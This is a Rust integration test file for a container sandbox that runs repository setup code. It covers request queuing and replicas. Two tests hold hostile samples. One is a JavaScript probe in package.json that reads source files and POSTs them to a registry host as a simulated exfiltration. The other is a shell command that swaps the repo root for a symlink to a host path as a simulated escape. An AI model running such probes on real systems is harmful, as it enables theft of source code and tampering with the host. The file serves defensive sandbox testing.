//! Escape tests against real containers, where rootless Docker is, as on the checker's host:
//!   cargo build --release --target x86_64-unknown-linux-musl && cargo test --test live -- --ignored

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use dorbs_check::adapter::{Adapters, Phase};
use dorbs_check::docker::{Docker, Egress, Limits};
use dorbs_check::environments::{self, EnvSpec, Environments, UseError};
use dorbs_check::protocol::{Change, CommitSha, RelativePath, RepoId};
use dorbs_check::recipe::{Recipe, SetupStep};
use dorbs_check::run;

// A manifest's code, which a setup step runs: it reads src/, posts it to an allowed registry host
// and notes in the home what it read and what the post answered.
const PROBE: &str = r#"
const fs = require("fs");
let source;
try {
  source = fs.readdirSync("src").map((file) => fs.readFileSync("src/" + file, "utf8")).join("");
} catch (error) {
  source = error.code;
}
fetch("https://registry.npmjs.org/-/dorbs-setup-escape-probe", { method: "POST", body: source, signal: AbortSignal.timeout(20000) })
  .then((response) => "HTTP " + response.status, (error) => "failed: " + (error.cause?.code ?? error.message))
  .then((post) => fs.writeFileSync("/env/home/" + process.env.PHASE + ".json", JSON.stringify({ source, post })));
"#;
const MARKER: &str = "dorbs-setup-escape-marker";

struct Host {
    root: PathBuf,
    prefix: String,
}

impl Drop for Host {
    fn drop(&mut self) {
        let docker = |args: &[&str]| Command::new("docker").args(args).output().unwrap();
        let filter = format!("name=^{}-", self.prefix);
        let listed = String::from_utf8_lossy(&docker(&["ps", "-aq", "--filter", &filter]).stdout)
            .into_owned();
        let names: Vec<&str> = listed.split_whitespace().collect();
        if !names.is_empty() {
            docker(&[&["rm", "-f"], names.as_slice()].concat());
        }
        docker(&["network", "rm", &format!("{}-setup", self.prefix)]);
        let _ = Command::new("rm").args(["-rf"]).arg(&self.root).status();
    }
}

fn host(name: &str) -> Host {
    let id = dorbs_check::random_id();
    let root = std::env::temp_dir().join(format!("dorbs-check-live-{name}-{id}"));
    std::fs::create_dir_all(root.join("data")).unwrap();
    Host {
        root,
        prefix: format!("dorbs-live-{}", &id[..8]),
    }
}

/// Commits `files` to a bare repo and answers the commit.
fn repo(git_dir: &Path, files: &[(&str, &str)]) -> CommitSha {
    let work = git_dir.with_extension("work");
    for (path, content) in files {
        std::fs::create_dir_all(work.join(path).parent().unwrap()).unwrap();
        std::fs::write(work.join(path), content).unwrap();
    }
    let git = |args: &[&str]| {
        let output = Command::new("git")
            .args(args)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
        String::from_utf8_lossy(&output.stdout).trim().to_owned()
    };
    let (g, w) = (
        git_dir.to_string_lossy().into_owned(),
        work.to_string_lossy().into_owned(),
    );
    git(&["init", "--quiet", "--bare", &g]);
    git(&["--git-dir", &g, "--work-tree", &w, "add", "--all"]);
    git(&[
        "--git-dir",
        &g,
        "--work-tree",
        &w,
        "-c",
        "user.name=t",
        "-c",
        "user.email=t@t",
        "commit",
        "-qm",
        "probe",
    ]);
    CommitSha::try_from(git(&["--git-dir", &g, "rev-parse", "HEAD"])).unwrap()
}

async fn environments(host: &Host, replicas: usize) -> (Arc<Docker>, Arc<Environments>, String) {
    let limits = Limits {
        memory: "1g".into(),
        setup_memory: "1g".into(),
        cpus: "1".into(),
        pids: 256,
        cgroup_parent: None,
    };
    let docker = Arc::new(Docker::new(
        &host.prefix,
        &host.root.join("data"),
        limits,
        Egress::Proxy,
    ));
    let adapters = Adapters::load(None).unwrap();
    let node = adapters.get("node").unwrap();
    // The proxy runs in a scratch image, so it is the static build of the binary.
    let binary = concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../../target/x86_64-unknown-linux-musl/release/dorbs-check"
    );
    docker
        .start_egress(&node.egress, Path::new(binary))
        .await
        .unwrap();
    let image = docker.image_id("node", &node.image).await.unwrap();
    let limits = environments::Limits {
        disk_budget: 1 << 30,
        idle_after: Duration::from_secs(600),
        retry_setup_after: Duration::from_secs(600),
        setup_timeout: Duration::from_secs(120),
        replicas,
    };
    let envs = Environments::start(&host.root.join("data"), docker.clone(), limits, replicas)
        .await
        .unwrap();
    (docker, envs, image)
}

fn step(id: &str, run: &str, phase: Phase) -> SetupStep {
    SetupStep {
        id: id.into(),
        run: run.into(),
        cwd: ".".into(),
        phase,
        key: vec!["package.json".into()],
        stubs: vec![],
    }
}

fn recipe(setup: Vec<SetupStep>) -> Recipe {
    Recipe {
        adapter: "node".into(),
        env: BTreeMap::new(),
        setup,
        checks: vec![],
        test: None,
        warm: vec![],
        notes: vec![],
    }
}

/// A request's place in line, as the service numbers requests on arrival.
fn ticket() -> u64 {
    static NEXT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
}

#[tokio::test]
#[ignore = "needs rootless Docker and the network"]
async fn gives_setup_code_no_source_while_it_has_the_network_and_no_network_once_it_has_the_source()
{
    let host = host("setup");
    let manifest = serde_json::json!({ "name": "escape", "dorbsProbe": PROBE }).to_string();
    let secret = format!("export const secret = \"{MARKER}\";\n");
    let git_dir = host.root.join("repo.git");
    let commit = repo(
        &git_dir,
        &[("package.json", &manifest), ("src/secret.ts", &secret)],
    );
    let (_, envs, image) = environments(&host, 1).await;
    let run = |phase: &str| {
        format!("PHASE={phase} node -e \"eval(require('./package.json').dorbsProbe)\"")
    };
    let spec = EnvSpec {
        key: "escape".into(),
        repo: RepoId::try_from("test/escape").unwrap(),
        git_dir,
        recipe: recipe(vec![
            step("online", &run("online"), Phase::Online),
            step("offline", &run("offline"), Phase::Offline),
        ]),
        image,
        key_change: Change::default(),
        online_paths: vec![RelativePath::try_from("package.json").unwrap()],
        online_change: Change::default(),
    };
    let used = envs
        .run(
            Arc::new(spec),
            ticket(),
            commit,
            Change::default(),
            vec![],
            || true,
        )
        .await;
    assert!(
        used.is_ok(),
        "setup failed: {:?}",
        used.err().map(|e| match e {
            UseError::SetupFailed(failed) => format!("{}: {}", failed.step, failed.output),
            UseError::UnsafePath(paths) => format!("{paths:?}"),
            UseError::Internal(error) => error,
            UseError::Abandoned => "abandoned".to_owned(),
        })
    );
    let seen = |phase: &str| -> serde_json::Value {
        let path = host
            .root
            .join(format!("data/envs/escape/home/{phase}.json"));
        serde_json::from_str(&std::fs::read_to_string(path).unwrap()).unwrap()
    };
    let (online, offline) = (seen("online"), seen("offline"));
    // Online the post goes out, with nothing of the source in it.
    assert_eq!(online["source"], "ENOENT");
    assert!(
        online["post"].as_str().unwrap().starts_with("HTTP "),
        "{online}"
    );
    // Offline the code reads the source, and the post goes nowhere.
    assert!(
        offline["source"].as_str().unwrap().contains(MARKER),
        "{offline}"
    );
    assert!(
        offline["post"].as_str().unwrap().starts_with("failed: "),
        "{offline}"
    );
}

#[tokio::test]
#[ignore = "needs rootless Docker"]
async fn writes_nothing_of_the_host_when_a_run_swaps_the_trees_root_for_a_link() {
    let host = host("root");
    let git_dir = host.root.join("repo.git");
    let commit = repo(
        &git_dir,
        &[
            ("package.json", "{}"),
            ("src/a.ts", "export const a = 1;\n"),
            (".bashrc", "planted\n"),
        ],
    );
    let canary = host.root.join("canary");
    std::fs::create_dir_all(&canary).unwrap();
    std::fs::write(canary.join(".bashrc"), "the host's own\n").unwrap();
    let (_, envs, image) = environments(&host, 1).await;
    let spec = Arc::new(EnvSpec {
        key: "swap".into(),
        repo: RepoId::try_from("test/swap").unwrap(),
        git_dir,
        recipe: recipe(vec![]),
        image,
        key_change: Change::default(),
        online_paths: vec![],
        online_change: Change::default(),
    });
    // The link names a host path; inside the container it leads nowhere, on the host to the canary.
    let swap = format!(
        "cd / && mv /env/repo /env/gone && ln -s {} /env/repo",
        canary.display()
    );
    let change: Change = serde_json::from_value(serde_json::json!({ "files": [{ "path": "src/a.ts", "content": "changed" }], "deleted": [] })).unwrap();
    let ran = envs
        .run(
            spec.clone(),
            ticket(),
            commit.clone(),
            change,
            vec![(
                run::Command {
                    cwd: ".".into(),
                    run: swap,
                },
                Duration::from_secs(60),
            )],
            || true,
        )
        .await;
    assert!(
        matches!(ran, Err(UseError::Internal(_))),
        "the broken tree is reported"
    );
    assert_eq!(std::fs::read_dir(&canary).unwrap().count(), 1);
    assert_eq!(
        std::fs::read_to_string(canary.join(".bashrc")).unwrap(),
        "the host's own\n"
    );
    assert!(
        envs.list()
            .iter()
            .any(|env| env.key == "swap" && format!("{:?}", env.state) == "Evicted")
    );
    // The next request sets the environment up anew.
    let again = envs
        .run(spec, ticket(), commit, Change::default(), vec![], || true)
        .await;
    assert!(again.is_ok());
}

#[tokio::test]
#[ignore = "needs rootless Docker"]
async fn runs_requests_for_one_change_at_once_and_queues_other_changes() {
    let host = host("join");
    let git_dir = host.root.join("repo.git");
    let commit = repo(
        &git_dir,
        &[
            ("package.json", "{}"),
            ("src/a.ts", "export const a = 1;\n"),
        ],
    );
    let (_, envs, image) = environments(&host, 1).await;
    let spec = Arc::new(EnvSpec {
        key: "join".into(),
        repo: RepoId::try_from("test/join").unwrap(),
        git_dir,
        recipe: recipe(vec![]),
        image,
        key_change: Change::default(),
        online_paths: vec![],
        online_change: Change::default(),
    });
    let change = |content: &str| -> Change {
        serde_json::from_value(serde_json::json!({ "files": [{ "path": "src/a.ts", "content": content }], "deleted": [] })).unwrap()
    };
    let sleep_and_read = || {
        vec![(
            run::Command {
                cwd: ".".into(),
                run: "sleep 2 && cat src/a.ts".into(),
            },
            Duration::from_secs(60),
        )]
    };
    envs.run(
        spec.clone(),
        ticket(),
        commit.clone(),
        Change::default(),
        vec![],
        || true,
    )
    .await
    .ok()
    .expect("the environment sets up");
    let timed = |content: &'static str| {
        let (envs, spec, commit) = (envs.clone(), spec.clone(), commit.clone());
        async move {
            let started = std::time::Instant::now();
            let used = envs
                .run(
                    spec,
                    ticket(),
                    commit,
                    change(content),
                    sleep_and_read(),
                    || true,
                )
                .await
                .ok()
                .expect("the run");
            (started.elapsed(), used.value[0].result.stdout.clone())
        }
    };
    let ((same_a, read_a), (same_b, read_b)) = tokio::join!(timed("one"), timed("one"));
    assert_eq!((read_a.as_str(), read_b.as_str()), ("one", "one"));
    assert!(
        same_a.max(same_b) < Duration::from_millis(3500),
        "one change runs at once: {same_a:?} {same_b:?}"
    );
    let ((other_a, read_a), (other_b, read_b)) = tokio::join!(timed("one"), timed("two"));
    assert_eq!((read_a.as_str(), read_b.as_str()), ("one", "two"));
    assert!(
        other_a.max(other_b) >= Duration::from_secs(4),
        "another change queues: {other_a:?} {other_b:?}"
    );
}

#[tokio::test]
#[ignore = "needs rootless Docker"]
async fn runs_queued_requests_in_the_order_they_arrived() {
    let host = host("order");
    let git_dir = host.root.join("repo.git");
    let commit = repo(
        &git_dir,
        &[
            ("package.json", "{}"),
            ("src/a.ts", "export const a = 1;\n"),
        ],
    );
    let (_, envs, image) = environments(&host, 1).await;
    let spec = Arc::new(EnvSpec {
        key: "order".into(),
        repo: RepoId::try_from("test/order").unwrap(),
        git_dir,
        recipe: recipe(vec![]),
        image,
        key_change: Change::default(),
        online_paths: vec![],
        online_change: Change::default(),
    });
    let change = |content: &str| -> Change {
        serde_json::from_value(serde_json::json!({ "files": [{ "path": "src/a.ts", "content": content }], "deleted": [] })).unwrap()
    };
    let read = |seconds: u32| {
        vec![(
            run::Command {
                cwd: ".".into(),
                run: format!("sleep {seconds} && cat src/a.ts"),
            },
            Duration::from_secs(60),
        )]
    };
    envs.run(
        spec.clone(),
        ticket(),
        commit.clone(),
        Change::default(),
        vec![],
        || true,
    )
    .await
    .ok()
    .expect("the environment sets up");
    let finished = Arc::new(Mutex::new(Vec::new()));
    let queued = |ticket: u64, content: &'static str, after: u64| {
        let (envs, spec, commit, finished) =
            (envs.clone(), spec.clone(), commit.clone(), finished.clone());
        async move {
            // Each reaches the line later than the one before it, but with an earlier ticket.
            tokio::time::sleep(Duration::from_millis(after)).await;
            let used = envs
                .run(spec, ticket, commit, change(content), read(0), || true)
                .await
                .ok()
                .expect("the run");
            finished
                .lock()
                .unwrap()
                .push(used.value[0].result.stdout.clone());
        }
    };
    let holder = envs.run(
        spec.clone(),
        ticket(),
        commit.clone(),
        change("first"),
        read(2),
        || true,
    );
    let base = 1_000_000;
    let (held, (), (), ()) = tokio::join!(
        holder,
        queued(base + 3, "fourth", 200),
        queued(base + 2, "third", 400),
        queued(base + 1, "second", 600),
    );
    assert_eq!(
        held.ok().expect("the first run").value[0].result.stdout,
        "first"
    );
    assert_eq!(*finished.lock().unwrap(), ["second", "third", "fourth"]);
}

#[tokio::test]
#[ignore = "needs rootless Docker"]
async fn gives_up_a_queued_request_nobody_waits_for_and_runs_the_next() {
    let host = host("abandon");
    let git_dir = host.root.join("repo.git");
    let commit = repo(
        &git_dir,
        &[
            ("package.json", "{}"),
            ("src/a.ts", "export const a = 1;\n"),
        ],
    );
    let (_, envs, image) = environments(&host, 1).await;
    let spec = Arc::new(EnvSpec {
        key: "abandon".into(),
        repo: RepoId::try_from("test/abandon").unwrap(),
        git_dir,
        recipe: recipe(vec![]),
        image,
        key_change: Change::default(),
        online_paths: vec![],
        online_change: Change::default(),
    });
    let change = |content: &str| -> Change {
        serde_json::from_value(serde_json::json!({ "files": [{ "path": "src/a.ts", "content": content }], "deleted": [] })).unwrap()
    };
    let sleep_and_read = || {
        vec![(
            run::Command {
                cwd: ".".into(),
                run: "sleep 2 && cat src/a.ts".into(),
            },
            Duration::from_secs(60),
        )]
    };
    envs.run(
        spec.clone(),
        ticket(),
        commit.clone(),
        Change::default(),
        vec![],
        || true,
    )
    .await
    .ok()
    .expect("the environment sets up");
    let waits = Arc::new(std::sync::atomic::AtomicBool::new(true));
    let ahead = envs.run(
        spec.clone(),
        ticket(),
        commit.clone(),
        change("one"),
        sleep_and_read(),
        || true,
    );
    let behind = {
        let waits = waits.clone();
        envs.run(
            spec.clone(),
            ticket(),
            commit.clone(),
            change("two"),
            sleep_and_read(),
            move || waits.load(std::sync::atomic::Ordering::Relaxed),
        )
    };
    let hang_up = async {
        tokio::time::sleep(Duration::from_millis(500)).await;
        waits.store(false, std::sync::atomic::Ordering::Relaxed);
    };
    let started = std::time::Instant::now();
    let (ahead, behind, ()) = tokio::join!(ahead, behind, hang_up);
    assert_eq!(
        ahead.ok().expect("the run ahead").value[0].result.stdout,
        "one"
    );
    assert!(matches!(behind, Err(UseError::Abandoned)));
    assert!(
        started.elapsed() < Duration::from_millis(3500),
        "the request nobody waits for does not run: {:?}",
        started.elapsed()
    );
    let next = envs
        .run(
            spec,
            ticket(),
            commit,
            change("three"),
            sleep_and_read(),
            || true,
        )
        .await
        .ok()
        .expect("the next run");
    assert_eq!(next.value[0].result.stdout, "three");
}

#[tokio::test]
#[ignore = "needs rootless Docker"]
async fn runs_other_changes_at_once_on_replicas_of_the_environment() {
    let host = host("replicas");
    let git_dir = host.root.join("repo.git");
    let commit = repo(
        &git_dir,
        &[
            ("package.json", "{}"),
            ("src/a.ts", "export const a = 1;\n"),
        ],
    );
    let (_, envs, image) = environments(&host, 2).await;
    let spec = Arc::new(EnvSpec {
        key: "replicas".into(),
        repo: RepoId::try_from("test/replicas").unwrap(),
        git_dir,
        recipe: recipe(vec![]),
        image,
        key_change: Change::default(),
        online_paths: vec![],
        online_change: Change::default(),
    });
    let timed = |content: &'static str| {
        let (envs, spec, commit) = (envs.clone(), spec.clone(), commit.clone());
        async move {
            let change: Change = serde_json::from_value(serde_json::json!({ "files": [{ "path": "src/a.ts", "content": content }], "deleted": [] })).unwrap();
            let command = run::Command {
                cwd: ".".into(),
                run: "sleep 2 && cat src/a.ts".into(),
            };
            let started = std::time::Instant::now();
            let used = envs
                .run(
                    spec,
                    ticket(),
                    commit,
                    change,
                    vec![(command, Duration::from_secs(60))],
                    || true,
                )
                .await
                .ok()
                .expect("the run");
            (started.elapsed(), used.value[0].result.stdout.clone())
        }
    };
    // The first pair sets the second replica up; the second finds both ready.
    tokio::join!(timed("one"), timed("two"));
    let ((a, read_a), (b, read_b)) = tokio::join!(timed("one"), timed("two"));
    assert_eq!((read_a.as_str(), read_b.as_str()), ("one", "two"));
    assert!(
        a.max(b) < Duration::from_millis(3500),
        "other changes run at once: {a:?} {b:?}"
    );
    let keys: Vec<String> = envs.list().into_iter().map(|env| env.key).collect();
    assert_eq!(keys, ["replicas", "replicas-1"]);
}
